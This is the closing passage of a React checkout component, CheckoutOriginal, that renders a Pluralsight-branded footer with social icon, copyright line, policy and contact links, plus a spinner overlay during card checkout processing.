                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
                </a>
              </div>
            </div>

          </div>

          {/* Bottom Footer */}
          <div className="border-t border-slate-700 pt-8 flex flex-col md:flex-row items-center justify-between">
            <div className="flex items-center gap-4 mb-4 md:mb-0">
              <div className="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center flex-shrink-0">
                <div className="w-0 h-0 border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-b-[8px] border-b-white"></div>
              </div>
              <p className="text-sm text-gray-400">
                Copyright 2004 - 2025 Pluralsight LLC. All rights reserved
              </p>
            </div>
            <div className="flex gap-6 text-sm text-gray-400">
              <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Terms of Service</a>
              <a href="https://legal.pluralsight.com/policies?name=privacy-notice" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a>
              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact Us</a>
            </div>
          </div>
        </div>
      </footer>
      
      {/* Full Screen Spinner Overlay - Only during card checkout processing */}
      {isCardCheckoutProcessing && (
        <ProcessingLoader />
      )}
    </div>
  );
  
  

}; // End of CheckoutOriginal

export default CheckoutOriginal;
export { CheckoutOriginal as Checkout };
